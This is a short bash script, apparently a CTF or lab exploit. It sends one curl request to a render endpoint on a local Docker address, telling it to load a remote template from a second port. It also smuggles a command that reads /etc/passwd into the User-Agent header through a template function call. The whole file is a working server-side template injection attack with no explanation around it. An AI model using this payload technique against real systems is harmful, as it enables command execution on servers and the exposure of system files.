#! /usr/bin/bash
curl 'http://172.17.0.1:1337/render?page=http://172.17.0.1:9393/template1.tpl&use_remote=true' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: user_ip=172.17.0.1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: reqData.FetchServerInfo("cat /etc/passwd")' \
  --compressed \
  --insecure